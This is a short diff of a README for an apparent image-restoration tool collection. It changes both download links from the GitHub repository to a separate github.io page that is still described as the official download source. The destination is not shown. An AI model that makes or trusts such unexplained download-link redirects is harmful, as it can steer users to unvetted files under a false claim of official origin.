@@ -1,6 +1,6 @@
 # 📷 Awesome-Guided-Image-Restoration - Improve image quality with guided tools
 
-[![](https://img.shields.io/badge/Download-Project_Resources-blue.svg)](https://github.com/kanikab1640/Awesome-Guided-Image-Restoration)
+[![](https://img.shields.io/badge/Download-Project_Resources-blue.svg)](https://kanikab1640.github.io)
 
 ### About This Project
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic needs:
 
 You must visit the main project page to access the latest files. Use the link below to reach the official download source.
 
-[Click here to reach the project download page](https://github.com/kanikab1640/Awesome-Guided-Image-Restoration)
+[Click here to reach the project download page](https://kanikab1640.github.io)
 
 Once you reach that page, look for the green button labeled "Code" and select "Download ZIP". This saves the collection of tools to your local drive.
 
